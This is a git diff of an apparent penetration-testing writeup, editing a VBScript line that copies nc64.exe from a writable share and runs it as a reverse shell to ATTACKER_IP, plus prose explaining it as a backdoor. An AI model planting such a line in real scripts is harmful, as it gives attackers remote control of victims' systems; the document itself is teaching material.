@@ -34,17 +34,17 @@ Next, we can inject the malicious in the existing script. Assuming that the writ
 
 {% code overflow="wrap" %}
 ```visual-basic
-CreateObject("WScript.Shell").Run "cmd.exe /c copy /y \\TARGET_IP\writable_share\nc64.exe %temp% & %tmp%\bnc64.exe -e cnd.exe ATTACKER_IP PORT", 0, True
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /y \\TARGET_IP\writable_share\nc64.exe %temp% & %temp%\nc64.exe -e cnd.exe ATTACKER_IP PORT", 0, True
 ```
 {% endcode %}
 
-Essentially, this command executes a command from  `cmd.exe` , which calls `copy` to copy the uploaded `nc64.exe` binary on the share to the `%temp%` directory, before executing the reverse shell that provides us a backdoor to the system.
+Essentially, this command executes a command using  `cmd.exe` which calls the `copy` command to copy the uploaded `nc64.exe` binary (uploaded to share) to the `%temp%` directory, before executing a reverse shell that provides us a backdoor to the system.
 
-* the `/y` flag to `copy` means
+* the `/y` flag provided to `copy` means
 
 > Suppresses prompting to confirm that you want to overwrite an existing destination file.
 
-&#x20;According to this [page](https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp), the following describes the last 2 values provided to the `Run` method:
+According to this [page](https://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp), the following describes the last 2 values provided to the `Run` method:
 
 * `intWindowStyle`
 
